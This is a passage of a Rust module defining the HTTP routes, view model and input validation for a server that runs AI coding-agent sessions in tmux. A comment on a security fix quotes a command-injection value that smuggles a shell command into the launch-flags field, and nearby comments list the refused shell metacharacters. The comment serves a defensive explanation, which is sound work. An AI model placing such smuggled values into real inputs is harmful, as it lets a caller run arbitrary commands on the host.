//! Session HTTP surface — the tmux-free CRUD subset.
//!
//! **Router-registry pattern.** [`router_for`] returns this module's
//! sub-router; `http::router` merges it (plus board/files/scheduler/agents in
//! later milestones) and applies the bearer-auth layer once. Adding a backend
//! milestone is one new module + one `.merge(...)` line — no shared edits here.
//!
//! **Scope.** Only the parts that need no live tmux: list/create/get/delete/
//! duplicate/config_patch, plus the DB-backed tracked-files and steering-queue
//! endpoints. `start/stop/send/keys/paste/clone/archive/wake/peek` are wired in
//! the lifecycle handlers below.
//!
//! **HTTP envelope.** Successful responses are `{ ok: true, data: T }`;
//! errors are `{ ok: false, error: "..." }` via [`crate::error::AppError`].
//!
//! **tmux lifecycle.** [`lifecycle`] wires the live operations
//! (start/stop/send/keys/paste/peek/archive/wake/clone) onto [`tmux`]; their
//! handlers are merged into [`router_for`] alongside the CRUD routes.

pub mod activity;
pub mod auto_actions;
pub mod chat;
pub mod elicitation;
pub mod host_pool;
pub mod lifecycle;
pub mod login;
pub mod pty;
pub mod pty_state;
pub mod recall;
pub mod resumable;
pub mod status;
pub mod steering;
pub mod teams;
pub mod tmux;
pub mod transport;
pub mod native;
pub mod runtime;

pub use host_pool::{spawn_reaper, HostPool};
pub use transport::{HostId, Transport, LOCAL as LOCAL_TRANSPORT};

use std::collections::HashMap;

use axum::body::Bytes;
use axum::extract::{Path, Query, State};
use axum::http::StatusCode;
use axum::response::IntoResponse;
// Routing constructors are fully-qualified (`axum::routing::get`) to avoid a name
// clash with this module's public `get`/`delete` API functions.
use axum::{Json, Router};
use base64::Engine;
use once_cell::sync::Lazy;
use rand::RngCore;
use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::json;

use crate::db;
use crate::db::sessions::{NewSession, Session, SessionRuntime};
use crate::error::AppError;
use crate::state::{AppState, SessionActivity};

/// Build the sessions sub-router (no auth layer — applied by `http::router`).
pub fn router_for(state: AppState) -> Router {
    use axum::routing::{get, patch, post};
    Router::new()
        .route("/api/sessions", get(list_handler).post(create_handler))
        // Archived (soft-deleted) sessions — the Archived sheet's data source.
        // Registered BEFORE `/api/sessions/{name}` so `archived` is matched as a
        // literal segment, never captured as a `{name}` path param.
        .route("/api/sessions/archived", get(list_archived_handler))
        .route(
            "/api/sessions/{name}",
            get(get_handler).delete(delete_handler),
        )
        // Hard delete (the "Delete forever" path) — archived-only, audited.
        .route("/api/sessions/{name}/purge", axum::routing::delete(purge_handler))
        .route("/api/sessions/{name}/duplicate", post(duplicate_handler))
        .route("/api/sessions/{name}/config", patch(config_handler))
        // ── tmux lifecycle ──
        .route("/api/sessions/{name}/start", post(start_handler))
        .route("/api/sessions/{name}/stop", post(stop_handler))
        .route("/api/sessions/{name}/send", post(send_handler))
        .route("/api/sessions/{name}/keys", post(keys_handler))
        .route("/api/sessions/{name}/paste", post(paste_handler))
        .route("/api/sessions/{name}/peek", get(peek_handler))
        // ── the OAuth login flow (AREA 3) ──
        // ONE read and ONE write, because every step of this flow is the same
        // three facts (what is on the screen, is supervision frozen, what key
        // goes next) and a route per step would be five ways to get the freeze
        // ordering wrong.
        .route(
            "/api/sessions/{name}/login",
            get(login_state_handler).post(login_action_handler),
        )
        .route("/api/sessions/{name}/recall", get(recall::handler))
        // ── the per-session harness-event feed ──
        // Replayable provenance for everything the harness did TO or FROM this
        // session (delegations, renames, schedule fires). SSE only says "look
        // again"; this is what survives a reload.
        .route("/api/sessions/{name}/events", get(events_handler))
        // ── chat data plane backlog (fase A2) ──
        // The live path is the WS (`/ws/sessions/{name}/chat`, registered in
        // `ws::router_for`); these two are the bearer-protected reads it cannot
        // serve from the in-memory ring: older pages, and the untruncated body
        // behind an entry the wire had to clip.
        .route(
            "/api/sessions/{name}/chat/history",
            get(chat::ws::history_handler),
        )
        .route(
            "/api/sessions/{name}/chat/entry/{uuid}",
            get(chat::ws::entry_handler),
        )
        // ── the OPT-IN Claude statusline tap (fase A2) ──
        // Host-wide, not per-session: Claude Code has ONE global `statusLine`
        // slot. Install is gated on `config.statusline_tap` AND is the only
        // path that can write that key — no create/start path reaches it
        // (pinned by `tests/statusline_optin.rs`). Uninstall is never gated:
        // taking our wrapper back out must always be possible.
        .route(
            "/api/claude/statusline/install",
            post(chat::statusline::install_handler),
        )
        .route(
            "/api/claude/statusline",
            axum::routing::delete(chat::statusline::uninstall_handler),
        )
        // B5/T4 — the cross-device seen cursor. PATCH, not POST: it advances a
        // value on the session rather than performing an action on it.
        .route("/api/sessions/{name}/seen", axum::routing::patch(seen_handler))
        // ── the manual recovery ladder (B5/T8) ──
        // Labelled by what they PRESERVE, not by how drastic they sound; see
        // `lifecycle`'s ladder table and BRAND.md §6h.
        .route("/api/sessions/{name}/restart", post(restart_handler))
        .route("/api/sessions/{name}/recover", post(recover_handler))
        .route("/api/sessions/{name}/reset", post(reset_handler))
        .route("/api/sessions/{name}/archive", post(archive_handler))
        .route("/api/sessions/{name}/unarchive", post(unarchive_handler))
        // ── switch the Claude permission mode from the ⋯ menu ──
        .route("/api/sessions/{name}/mode", post(mode_handler))
        // ── reopen a past Claude conversation for the dir ──
        .route(
            "/api/sessions/{name}/resumable",
            get(resumable_handler),
        )
        .route("/api/sessions/{name}/resume", post(resume_handler))
        // The dashboard "Done"/"Cancel" of the native editor sheet resolves the
        // session's in-flight edit. Bearer-gated (a dashboard→server call); the
        // bridge-side open/result are hook-token-authed on the `external_edit`
        // router merged at the top level.
        .route(
            "/api/sessions/{name}/external-edit/submit",
            post(external_edit_submit_handler),
        )
        // Live git status for the session's working dir (real branch / dirty /
        // ahead-behind) — read lazily when the info panel opens.
        .route("/api/sessions/{name}/git", get(git_handler))
        .route(
            "/api/sessions/{name}/tracked-files",
            get(tracked_list_handler)
                .post(tracked_add_handler)
                .delete(tracked_remove_handler),
        )
        .route(
            "/api/sessions/{name}/steer",
            get(steer_list_handler)
                .post(steer_add_handler)
                .delete(steer_clear_handler),
        )
        .with_state(state)
}

// ── HTTP envelope ────────────────────────────────────────────────────────────

#[derive(Serialize)]
struct Envelope<T> {
    ok: bool,
    data: T,
}

/// Wrap a success payload in the `{ ok: true, data }` envelope (defaults to 200).
fn ok<T: Serialize>(data: T) -> Json<Envelope<T>> {
    Json(Envelope { ok: true, data })
}

// ── view model ───────────────────────────────────────────────────────────────

/// The session shape returned to clients (superset of the frontend
/// `SessionSummary`/`Session` types). `status`/`preview_lines` are populated by
/// the status detector; until then a session reads as `stopped` with no
/// preview lines.
#[derive(Debug, Serialize)]
pub struct SessionView {
    pub name: String,
    /// Mutable human label (migration 0019). Always non-empty: the slug `name`
    /// when the user hasn't set one. The frontend shows this; `name` stays the
    /// key for routes/API/SSE.
    pub display_name: String,
    pub status: String,
    pub dir: String,
    pub provider: String,
    pub desc: String,
    pub pinned: bool,
    pub archived: bool,
    pub auto_continue: bool,
    pub tags: Vec<String>,
    /// The user's identity-mark override (migration 0027), `"<silhouette>:<hue>"`
    /// or `None`. Assignment is derived client-side; this is written only by the
    /// reroll affordance.
    pub mark_pin: Option<String>,
    /// This bot's own notification policy (migration 0028) — the per-BOT half of
    /// the mute decision, ANDed with the global per-category toggles. Always
    /// present on the wire (never omitted), because the control has to render a
    /// definite state and `inherit` is a real choice, not an absence.
    pub notif: String,
    /// The cross-device seen cursor (migration 0029), or `None` for never seen.
    /// Same triple the client's `SeenCursor` carries, so the merge is
    /// field-for-field.
    pub seen_ts: Option<i64>,
    pub seen_count: Option<i64>,
    pub seen_epoch: Option<i64>,
    pub flags: String,
    pub branch: String,
    pub mcp: String,
    pub worktree: bool,
    pub creator: String,
    /// Which terminal backend drives this session (migration 0024): `"tmux"` or
    /// `"native"`. ADDITIVE field — always present, `"tmux"` for the entire
    /// existing fleet, so no client that ignores it sees any change. Exposed so
    /// the UI can badge a native session (and so a native-vs-tmux bug report
    /// carries the answer without a DB dump).
    pub runtime: String,
    /// Last 6 lines of `last_capture`, ANSI-stripped.
    pub preview_lines: Vec<String>,
    /// Same last 6 lines, with SGR escape sequences preserved — the colour-true
    /// tile preview source (overview tile preview feature). Empty until the
    /// first capture; the client falls back to `preview_lines` when so.
    pub preview_ansi: Vec<String>,
    /// Live "current activity" line derived from the latest `PreToolUse` hook:
    /// a short, emoji-prefixed label like `✎ tile.tsx` / `⚡ npm test`.
    /// In-memory only (never persisted); `None` when the agent isn't
    /// mid-tool (cleared on `Stop`/`SessionEnd`). The UI shows it under the
    /// status dot while the session is working, falling back to the spinner.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub activity: Option<String>,
    /// The machine-readable activity class for [`activity`](Self::activity)
    /// (`bash`/`edit`/`read`/`search`/`web`/`task`/`mcp`/`tool`) so the UI can
    /// style without re-parsing the emoji. `None` whenever `activity` is.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub activity_kind: Option<String>,
    /// The latest unrecovered agent error from a `StopFailure` hook:
    /// `{type, message}` (e.g. `rate_limit` / `billing_error`). In-memory only;
    /// cleared on the next `UserPromptSubmit`/`SessionStart`. Drives the amber
    /// error badge on the card.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<ErrorInfo>,
    /// Live count of outstanding Task sub-agents for the current turn (fed by the
    /// `SubagentStart`/`SubagentStop` hooks). DISPLAY-ONLY parallelism signal:
    /// the overview shows a calm `· N subagents` clause when the session is
    /// `active` and this is ≥ 2. Never a status/turn-boundary signal. Omitted
    /// when 0 (the common case) so a resting session's wire shape is unchanged.
    #[serde(skip_serializing_if = "is_zero", default)]
    pub subagents: u32,
    /// The LIVE permission dialog, from the `PermissionRequest` hook: Claude is
    /// displaying a permission prompt for this tool call and is blocked on a
    /// human. In-memory only; cleared as soon as anything proves the dialog
    /// resolved (`PostToolUse*`/`Stop`/`SessionEnd`/`UserPromptSubmit`/
    /// `SessionStart`) — no hook reports the user's choice. Omitted when there is
    /// no pending dialog, so a resting session's wire shape is unchanged.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub permission_request: Option<PermissionRequestInfo>,
    /// **The live MCP elicitation form**, from the `Elicitation` hook: a
    /// third-party MCP server has stopped mid-tool-call and is demanding typed
    /// input. Carried whole (server name, the server's own sentence, the typed
    /// fields) because the card IS the form — capped in
    /// [`elicitation`](crate::sessions::elicitation), in-memory only, and every
    /// string in it is authored by a third party. Omitted when nothing is
    /// asking, so a resting session's wire shape is unchanged.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub elicitation: Option<elicitation::ElicitationAsk>,
    /// The Claude Code permission MODE parsed from the persistent status bar in
    /// `last_capture`: `normal` / `accept_edits` / `plan` / `bypass`.
    /// `None` until the first capture (the menu then defaults to `normal`). Drives
    /// the ⋯ mode menu's live-checked radio — the menu reflects the TRUE mode, not
    /// an optimistic guess. Cheap (a pure string scan over the held capture).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub mode: Option<String>,
    /// **The session cannot do the next turn** — a usage-limit banner or a
    /// startup gate on the held capture ([`pty_state`]).
    ///
    /// A CONDITION, not a status, and that distinction is the whole point: a
    /// limit-hit turn ends with a `Stop` hook, so `status` is `idle` and every
    /// surface drew the session green while the account was cut off for five
    /// hours (verify matrix finding 1). Derived from the capture on every read,
    /// like [`mode`](Self::mode) — so it clears by itself the moment the banner
    /// scrolls out of the live window, and no state has to be invalidated.
    /// Omitted when the session is fine, so a healthy row's wire shape is
    /// unchanged.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub blocked: Option<pty_state::Blocked>,
    /// The dim footer line Claude Code prints at ≥70 % utilisation, verbatim
    /// (`You've used 77% of your … limit · resets …`). A quiet chip — the
    /// session still works — and the ONLY warning plane there is: this line
    /// never appears in the transcript JSONL at all.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub limit_warning: Option<String>,
    /// Usage headroom from the opt-in Claude **statusline tap**
    /// ([`chat::statusline`]), when one is installed on this host.
    ///
    /// The only poll-free, machine-readable source of "how much is left" — as
    /// opposed to [`blocked`](Self::blocked), which is the after-the-fact banner.
    /// Absent for every session on a host without the tap, which is every host
    /// by default (`config.statusline_tap` is `false`, and this change does not
    /// touch that default). Also absent on a fresh boot: Claude Code omits
    /// `rate_limits` from the payload until a response has carried the headers
    /// behind it.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub rate_limits: Option<RateLimits>,
    /// The user's last sent prompt to this session (≤200 chars, control chars
    /// stripped), as captured by `db::sessions::set_last_send`. `None` when the
    /// session has never received a submission. Drives the last-prompt recall
    /// affordance on the focus screen (glass bar + popover + mobile sheet).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_send_text: Option<String>,
    /// Epoch seconds when `last_send_text` was written. `None` when there is no
    /// last send. Pairs with `last_send_text` for the recall affordance's
    /// "<relative time> ago" label.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_send_at: Option<i64>,
    pub created_at: String,
    pub updated_at: String,
}

/// The `SessionView.error` shape: a `StopFailure`-derived error class
/// plus a human message. Both are size-capped and secret-conscious upstream (see
/// [`activity::error_info`]); in-memory only, never persisted.
#[derive(Debug, Clone, Serialize)]
pub struct ErrorInfo {
    /// The error class (`rate_limit`, `billing_error`, `authentication_failed`,
    /// …), defaulting to `"error"` when Claude omitted `error_type`.
    #[serde(rename = "type")]
    pub error_type: String,
    /// The human-readable error message (may be empty).
    pub message: String,
}

/// The `SessionView.rate_limits` shape — the two buckets Claude Code's
/// statusline payload carries, typed at last.
///
/// `statusline::Statusline` holds `rate_limits` as an opaque `Value` because its
/// internals drift across versions, and that opacity is why nothing ever read
/// it: `AppState::statusline()` had ZERO call sites, so a 900-line tap that
/// works correctly was built and left dark (verify matrix finding 7). This is
/// the narrowest possible typing of it — the two fields the documented recipe
/// names, both optional at every level, with anything unrecognised dropped
/// rather than guessed.
///
/// KNOWN LIMITS, stated because a gauge that overclaims is worse than none:
/// there is no `blocked` flag here, no Opus/Sonnet split and no overage bucket,
/// and the whole key is absent on a fresh boot. It says how full the window is;
/// it cannot say the session is cut off. That is [`SessionView::blocked`]'s job.
#[derive(Debug, Clone, Default, Serialize, PartialEq)]
pub struct RateLimits {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub five_hour: Option<RateWindow>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub seven_day: Option<RateWindow>,
    /// Server-clock ms at which the tap last reported. The payload has no
    /// timestamp of its own and the tap is per-turn, so a stale gauge has to be
    /// recognisable as one.
    pub at_ms: i64,
}

/// One usage window.
#[derive(Debug, Clone, Serialize, PartialEq)]
pub struct RateWindow {
    /// `used_percentage`, 0–100.
    pub used_pct: f64,
    /// `resets_at`, UNIX epoch SECONDS (Claude Code's unit, passed through
    /// rather than converted — a silent unit change here is a countdown that is
    /// wrong by a factor of 1000).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub resets_at: Option<i64>,
}

impl RateLimits {
    /// Read the two buckets out of a statusline snapshot, or `None` when the
    /// payload carried neither. Lenient by construction: a bucket without a
    /// `used_percentage` is not a bucket, and an unknown sibling key is ignored.
    pub fn from_statusline(s: &chat::statusline::Statusline) -> Option<Self> {
        let raw = s.rate_limits.as_ref()?;
        let window = |key: &str| -> Option<RateWindow> {
            let b = raw.get(key)?;
            Some(RateWindow {
                used_pct: b.get("used_percentage")?.as_f64()?,
                resets_at: b.get("resets_at").and_then(serde_json::Value::as_i64),
            })
        };
        let five_hour = window("five_hour");
        let seven_day = window("seven_day");
        if five_hour.is_none() && seven_day.is_none() {
            return None;
        }
        Some(Self {
            five_hour,
            seven_day,
            at_ms: s.at_ms,
        })
    }
}

/// The `SessionView.permission_request` shape — the wire form of
/// [`activity::PermissionAsk`]. Display-only and size-capped upstream; in-memory
/// only, never persisted.
#[derive(Debug, Clone, Serialize)]
pub struct PermissionRequestInfo {
    /// The tool being asked about (`Bash`, `Edit`, `mcp__a__b`, …).
    pub tool: String,
    /// The short, secret-conscious summary (same derivation as `activity`).
    pub summary: String,
    /// The activity class of `summary` (`bash`/`edit`/`read`/…).
    pub kind: String,
    /// The permission mode the dialog was raised under (`default`/`acceptEdits`/
    /// `plan`/`bypassPermissions`), when the payload carried one. Hooks are the
    /// only live source of this — the statusline JSON does not carry it.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub mode: Option<String>,
}

fn view(
    s: &Session,
    rt: Option<&SessionRuntime>,
    act: Option<SessionActivity>,
    // The statusline snapshot, when the opt-in tap is installed AND has fired
    // for this session. Threaded in rather than fetched here so `view` stays a
    // pure function of its arguments (every caller already holds the state).
    statusline: Option<chat::statusline::Statusline>,
) -> SessionView {
    let last_status = rt.map(|r| r.last_status.as_str()).unwrap_or("unknown");
    let last_capture = rt.map(|r| r.last_capture.as_str()).unwrap_or("");
    let last_capture_ansi = rt.map(|r| r.last_capture_ansi.as_str()).unwrap_or("");
    let updated_ts = s.last_send.max(s.last_started).max(s.created_at);
    // One read of the capture for both the block and the warning — they are two
    // answers to one question and the reader decides between them by precedence.
    let pty = pty_state::read(last_capture);
    SessionView {
        name: s.name.clone(),
        display_name: if s.display_name.is_empty() {
            s.name.clone()
        } else {
            s.display_name.clone()
        },
        status: normalize_status(last_status),
        dir: s.dir.clone(),
        provider: s.provider.clone(),
        desc: s.desc.clone(),
        pinned: s.pinned != 0,
        archived: s.archived != 0,
        auto_continue: s.auto_continue != 0,
        tags: parse_tags(&s.tags),
        // Empty string and NULL both mean "no override" — the client falls back
        // to the derived face either way, and normalising here keeps the wire
        // from carrying two spellings of the same absence.
        mark_pin: s.mark_pin.as_deref().filter(|v| !v.is_empty()).map(str::to_string),
        // Normalised through `parse`, so a hand-edited junk value in the column
        // reaches the client as `inherit` rather than as something its four-way
        // control cannot render.
        notif: crate::notify::NotifPolicy::parse(&s.notif).as_str().to_string(),
        // B5/T4.3 — the stored cursor rides the row, so a device that has never
        // seen this session starts correct instead of showing everything as
        // unread until its first local read.
        seen_ts: s.seen_ts,
        seen_count: s.seen_count,
        seen_epoch: s.seen_epoch,
        flags: s.flags.clone(),
        branch: s.branch.clone(),
        mcp: s.mcp.clone(),
        worktree: s.worktree != 0,
        creator: s.creator.clone(),
        // Rows written before migration 0024 (and the test-only
        // `insert_minimal`) can read back empty; present them as the tmux
        // default so the field is never blank on the wire.
        runtime: if s.runtime.is_empty() {
            runtime::RUNTIME_TMUX.to_string()
        } else {
            s.runtime.clone()
        },
        preview_lines: preview_lines(last_capture),
        preview_ansi: last_n_lines(last_capture_ansi, 20),
        activity: act.as_ref().and_then(|a| a.activity.clone()),
        activity_kind: act.as_ref().and_then(|a| a.activity_kind.clone()),
        subagents: act.as_ref().map(|a| a.subagents).unwrap_or(0),
        permission_request: act.as_ref().and_then(|a| {
            a.permission.as_ref().map(|ask| PermissionRequestInfo {
                tool: ask.tool.clone(),
                summary: ask.summary.clone(),
                kind: ask.kind.clone(),
                mode: ask.mode.clone(),
            })
        }),
        elicitation: act.as_ref().and_then(|a| a.elicitation.clone()),
        error: act.and_then(|a| a.error.map(|(error_type, message)| ErrorInfo {
            error_type,
            message,
        })),
        // Parse the permission mode from the held capture. `None` before the
        // first capture (the UI defaults the menu to Normal then).
        mode: if last_capture.is_empty() {
            None
        } else {
            Some(status::parse_mode(last_capture).as_str().to_string())
        },
        // Same shape as `mode`: a pure scan over the held capture, so it is
        // always as fresh as the capture and never needs invalidating.
        blocked: pty.blocked,
        limit_warning: pty.warning,
        rate_limits: statusline.as_ref().and_then(RateLimits::from_statusline),
        // Last user prompt + its epoch. Pair them: either both Some, or both
        // None (no submission yet). The DB stores empty string + 0 as the
        // "never sent" sentinel.
        last_send_text: if s.last_send_text.is_empty() {
            None
        } else {
            Some(s.last_send_text.clone())
        },
        last_send_at: if s.last_send_text.is_empty() {
            None
        } else {
            Some(s.last_send)
        },
        created_at: to_rfc3339(s.created_at),
        updated_at: to_rfc3339(updated_ts),
    }
}

/// `serde` skip predicate: omit the `subagents` count when it's 0 (the common
/// case), keeping a resting session's wire shape byte-identical to before.
fn is_zero(n: &u32) -> bool {
    *n == 0
}

/// Map the DB `last_status` onto the API status union. A session with no live
/// detection (`unknown`) reads as `stopped` for the client.
fn normalize_status(s: &str) -> String {
    match s {
        "active" | "waiting" | "idle" | "stopped" | "starting" => s.to_string(),
        _ => "stopped".to_string(),
    }
}

fn parse_tags(json_str: &str) -> Vec<String> {
    serde_json::from_str::<Vec<String>>(json_str).unwrap_or_default()
}

fn to_rfc3339(ts: i64) -> String {
    chrono::DateTime::<chrono::Utc>::from_timestamp(ts, 0)
        .unwrap_or_else(|| chrono::DateTime::<chrono::Utc>::from_timestamp(0, 0).unwrap())
        .to_rfc3339()
}

/// Strip CSI escape sequences (covers SGR colour codes and cursor moves).
static ANSI_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"\x1b\[[0-9;?]*[ -/]*[@-~]").unwrap());

/// Last N lines of `capture`, ANSI-stripped (drives `SessionSummary.preview_lines`).
/// Sized to 20 so the Settings → Expanded-text hover mode has the full tail to
/// reveal; the static tile still only renders the bottom ~6 (CSS-clipped by the
/// idle container height + the top fade mask), so no compactness regression.
fn preview_lines(capture: &str) -> Vec<String> {
    if capture.is_empty() {
        return Vec::new();
    }
    let stripped = ANSI_RE.replace_all(capture, "");
    let lines: Vec<String> = stripped.lines().map(str::to_string).collect();
    let start = lines.len().saturating_sub(20);
    lines[start..].to_vec()
}

/// Last `n` lines of `capture` VERBATIM (escapes kept) — drives `preview_ansi`,
/// the colour-true tile preview. `capture` is already trimmed of trailing blanks
/// upstream (`prepare_capture_ansi`).
fn last_n_lines(capture: &str, n: usize) -> Vec<String> {
    if capture.is_empty() {
        return Vec::new();
    }
    let lines: Vec<String> = capture.lines().map(str::to_string).collect();
    let start = lines.len().saturating_sub(n);
    lines[start..].to_vec()
}

// ── validation helpers ───────────────────────────────────────────────────────

static NAME_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^[A-Za-z0-9_.-]+$").unwrap());
const PROVIDERS: [&str; 3] = ["claude", "codex", "shell"];

/// Providers supermux once shipped and has since RETIRED. Their rows still exist
/// in deployed databases (the `provider` column is free-form TEXT, and the
/// sessions CHECK was relaxed to accept them), so every read path — list, get,
/// status, the tile render — must keep tolerating the string exactly as it is
/// stored. What must NOT happen is a retired row being started: the launch
/// builder's fallback arm would boot CLAUDE under a Kimi row's name, which is a
/// silent lie. [`lifecycle::start`] refuses them with a 400 instead.
///
/// Deliberately NOT in [`PROVIDERS`]: creating a new session with a retired
/// provider is a 400 at the HTTP boundary, so the set can only shrink over time.
const RETIRED_PROVIDERS: [&str; 1] = ["kimi"];

/// True when `provider` names a retired provider — a row that may be listed and
/// rendered but can never be launched again. See [`RETIRED_PROVIDERS`].
pub(crate) fn is_retired_provider(provider: &str) -> bool {
    RETIRED_PROVIDERS.contains(&provider)
}

/// Session-name slug rule: `[a-zA-Z0-9_.-]+`, bounded. The FIRST char must NOT
/// be `-` — the session name flows through to argv for the provider CLI
/// (`claude --session-id <name>` etc.), and a leading dash would be parsed as
/// an option flag (CLI-flag injection).
pub(crate) fn valid_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 100
        && NAME_RE.is_match(name)
        && !name.starts_with('-')
        // `.` and `..` slip past the regex (it allows `[A-Za-z0-9_.-]`) and are
        // path-traversal escapes when the name is used as a path segment — the
        // teams config path build is one such caller. Forbid them explicitly.
        && name != "."
        && name != ".."
}

// Claude conversation/session ids land in a shell-interpolated launch line
// (see `lifecycle::build_launch_command`). Validate at the boundary: real
// Claude ids are UUIDs / alphanumeric+dash; a conservative `[A-Za-z0-9._-]`
// rule excludes whitespace, quotes, `$`, backtick, `;`, `|`, `&`, etc., which
// is the entire shell-meta surface we care about. Anything that doesn't match
// is a 400 BadRequest before the DB write.
static CC_ID_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^[A-Za-z0-9._-]{1,128}$").unwrap());

/// Claude conversation/session id charset — `[A-Za-z0-9._-]`, 1..=128 chars,
/// and never an all-dots string.
///
/// The all-dots exclusion is the same rule [`valid_name`] carries, for the same
/// reason: since the A2 chat data plane the id is also a PATH SEGMENT
/// (`<project>/<id>.jsonl`, `<project>/<id>/subagents/`), and `..` is the one
/// string the charset admits that walks out of the project directory.
pub(crate) fn valid_cc_id(id: &str) -> bool {
    CC_ID_RE.is_match(id) && !id.bytes().all(|b| b == b'.')
}

fn valid_provider(provider: &str) -> bool {
    PROVIDERS.contains(&provider)
}

/// Characters a launch-flags string may contain, beyond ASCII letters and
/// digits. Everything else — quotes, `;`, `&`, `|`, backtick, `$`, `(`, `)`,
/// `<`, `>`, `\`, `*`, `?`, newline, and every non-ASCII byte — is refused.
///
/// The allowed set is what real launch flags are made of: the switch itself
/// (`--permission-mode`), its value (`bypassPermissions`, `opus`), a path
/// (`--add-dir /srv/app`, `--mcp-config ./mcp.json`), a `key=value`
/// (`--setting model=opus`), a list (`a,b`), a version (`gpt-5-codex`), and the
/// spaces between them.
const FLAG_EXTRA_CHARS: &[char] = &[' ', '-', '_', '.', '/', '=', ':', ',', '+', '@', '%'];

/// The first character of `flags` that is not launch-flag material, if any.
fn offending_flag_char(flags: &str) -> Option<char> {
    flags
        .chars()
        .find(|c| !c.is_ascii_alphanumeric() && !FLAG_EXTRA_CHARS.contains(c))
}

/// Reject a caller-supplied launch-flags string that carries shell
/// metacharacters (SEC-01).
///
/// WHY THIS IS A BOUNDARY CHECK. `flags` is stored verbatim and later spliced
/// into the launch line that is TYPED INTO THE PANE'S SHELL
/// (`lifecycle::build_launch_command`). Before this check,
/// `flags: "--version >/dev/null; touch /tmp/pwned; claude"` ran `touch` in the
/// pane as the service user — an authenticated caller could turn "create a
/// session" into "run this command on the host", which is a privilege the API
/// never meant to hand out (the web client sends a typed `bypass_permissions`
/// boolean and never raw flags).
///
/// The 400 NAMES the offending character, because "invalid flags" on a string
/// the caller composed by hand is unactionable. The second layer —
/// `lifecycle::quoted_flag_words` — quotes whatever is stored anyway, so a row
/// written before this check existed is also inert.
fn validate_flags(flags: &str) -> Result<(), AppError> {
    match offending_flag_char(flags) {
        None => Ok(()),
        Some(c) => Err(AppError::BadRequest(format!(
            "invalid launch flags: {c:?} is not allowed (flags are spliced into the launch \
             command line; allowed: letters, digits, space and {})",
            FLAG_EXTRA_CHARS
                .iter()
                .filter(|c| **c != ' ')
                .collect::<String>()
        ))),
    }
}

/// Fresh per-session hook token: 32 bytes from the OS CSPRNG, base64url.
pub(crate) fn gen_hook_token() -> String {
    let mut buf = [0u8; 32];
    rand::rngs::OsRng.fill_bytes(&mut buf);
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(buf)
}

async fn ensure_session(state: &AppState, name: &str) -> Result<(), AppError> {
    if db::sessions::exists(&state.pool, name).await? {
        Ok(())
    } else {
        Err(AppError::NotFound(format!("session '{name}'")))
    }
}

// ── the harness-event feed ───────────────────────────────────────────────────

/// Hard ceiling on one `GET /api/sessions/{name}/events` page.
const EVENTS_LIMIT_MAX: i64 = 200;
/// What a client gets when it names no `limit`.
const EVENTS_LIMIT_DEFAULT: i64 = 100;

fn events_limit_default() -> i64 {
    EVENTS_LIMIT_DEFAULT
}

#[derive(Debug, Deserialize)]
pub struct EventsQuery {
    /// EXCLUSIVE cursor: return rows with a strictly greater id. `0` (the
    /// default) means "from the beginning".
    #[serde(default)]
    pub since_id: i64,
    #[serde(default = "events_limit_default")]
    pub limit: i64,
}

#[derive(Debug, Serialize)]
pub struct EventsResponse {
    /// Ascending by id — the client appends, it never re-sorts.
    pub events: Vec<crate::db::runtime_state::AuditEntry>,
}

/// `GET /api/sessions/{name}/events?since_id=&limit=` — the session's harness
/// events, oldest first.
///
/// The transcript's system lines are rendered from THIS, not from SSE: SSE has
/// no replay, so anything that only existed as a live frame would vanish on
/// reload. `detail` is passed through as the JSON *string* the ledger stores;
/// the client parses it once.
async fn events_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Query(q): Query<EventsQuery>,
) -> Result<Json<Envelope<EventsResponse>>, AppError> {
    ensure_session(&state, &name).await?;
    let limit = q.limit.clamp(1, EVENTS_LIMIT_MAX);
    let events =
        db::audit::events_for_session(&state.pool, &name, q.since_id.max(0), limit).await?;
    Ok(ok(EventsResponse { events }))
}

/// Fire the `harness` SSE tick for a surfaced audit entry.
///
/// `sessions` lists every session whose feed this entry belongs to — a
/// delegation is news to both ends, a rename only to the renamed one. Clients
/// use it purely to decide whether to refetch; the entry rides along so a
/// listener that is already up to date needs no round-trip.
pub fn emit_harness(state: &AppState, sessions: &[&str], entry: &crate::db::runtime_state::AuditEntry) {
    let _ = state.sse_tx.send(crate::state::SseEvent {
        event: "harness".into(),
        payload: json!({ "sessions": sessions, "entry": entry }),
    });
}

/// Write a surfaced audit row and fire its `harness` tick in one step.
///
/// Every action in [`db::audit::SURFACED_ACTIONS`] should go through here:
/// splitting the ledger write from the echo is how a feed silently stops
/// updating live while still being correct after a reload.
pub async fn audit_harness(
    state: &AppState,
    actor: &str,
    action: &str,
    target: &str,
    detail: serde_json::Value,
    sessions: &[&str],
) -> sqlx::Result<()> {
    let entry = db::audit::log_entry(&state.pool, actor, action, target, detail).await?;
    emit_harness(state, sessions, &entry);
    Ok(())
}

// ── public API (reused by the lifecycle module) ──────────────────────────────

pub async fn list(state: &AppState) -> Result<Vec<SessionView>, AppError> {
    let sessions = db::sessions::list(&state.pool).await?;
    let rt_map: HashMap<String, SessionRuntime> = db::sessions::list_runtimes(&state.pool)
        .await?
        .into_iter()
        .map(|r| (r.name.clone(), r))
        .collect();
    Ok(sessions
        .iter()
        .map(|s| {
            view(
                s,
                rt_map.get(&s.name),
                state.session_activity(&s.name),
                state.statusline(&s.name),
            )
        })
        .collect())
}

pub async fn get(state: &AppState, name: &str) -> Result<SessionView, AppError> {
    let s = db::sessions::get(&state.pool, name)
        .await?
